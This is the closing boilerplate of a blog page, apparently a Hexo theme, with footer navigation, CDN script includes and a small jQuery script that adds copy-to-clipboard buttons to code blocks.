       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
